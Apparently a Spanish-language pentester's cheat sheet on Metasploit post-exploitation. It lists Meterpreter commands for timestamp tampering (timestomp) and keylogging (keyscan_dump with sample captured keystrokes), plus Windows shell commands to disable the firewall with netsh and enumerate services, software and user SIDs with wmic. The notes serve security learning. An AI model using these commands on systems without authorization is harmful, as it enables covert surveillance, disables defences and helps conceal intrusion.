# METASPLOIT:
Pequeña sección con hightlights sobre la suite de metasploit.

## Session:
Cuando ya hayas obtenido una "session" lo más comun son dos escenarios.

- Meterpreter:
  - Conjunto de herramientas que automatizan tareas dentro del equipo, son funciones precargadas por así decirlo, como siempre esto ya se esta quedando en desuso, por que simplemente hace demasiado ruido.
-  Shell:
  - Es la comunicación directa a la linea de comandos de un sistema, ya sea en windows (cmd, powershell, etc) o en linux por (sh, bash, etc.) incluso por una independiente de un servicio como son las web shell, una linea de comandos de jenkins, etc.

### Meterpreter:
Conjunto de funciones que automatizan el pentesting como:

#### Timestomp:
Analizis del timestamp de ficheros:
```
meterpreter > timestomp Fichero.txt -v
meterpreter > timestomp Fichero.txt -m "02/11/2008 08:10:03"
```

#### Cat:
Lectura de ficheros
```
meterpreter > cat Fichero.txt
```

#### Keyscan_start:
Keylogger automatizado:
```
meterpreter > keyscan_start
meterpreter > keyscan_dump
Dumping captured keystrikes...
vav<Shift>my phone number is...<Shift>
```

#### Idle:
Ver tiempo de inactividad en el equipo.
```
meterpreter > idletime
User has been idle for: 53 secs
```

#### search:
Buscar archivo
```
meterpreter > search -f namefile.txt
```

#### Shell:
Tambien podemos mandar a llamar a una shell directa.
```
meterpreter > shell
```

- Dir:
  - Busqueda de archivos ocultos
```
shell > dir /a:h
```

- sc:
  - Buscar servicios:
```
shell > sc queryex type=service state=all
```

- netsh:
  - Analizar el estatus del firewall.
```
shell > netsh firewall show state
shell > netsh show config
shell > netsh advfirewall show allprofiles
```
  - Apagar el firewall.
```
shell > netsh firewall set currentprofile state off
shell > netsh firewall set allprofiles state off
```

- findstr:
  - Buscar archivos por su nombre.
 ```
shell > findstr /E ".txt" > txt.txt
shell > findstr /E ".log" > log.txt
```

- wmic:
  - windows managment instrumentation, herramientas similares a las nativas de bash que nos ayudan a la adminstración de windows.
    - Versiones de software instalado.
```
wmic /node:"" product get name,version,vendor
```
    - Información del CPU:
```
wmic cpu get
```
    - SID de los usuarios:
```
wmic useraccount get name,sid
```
    - Reiniciar el sistema:
```
wmic os where Primary='TRUE' reboot 
```







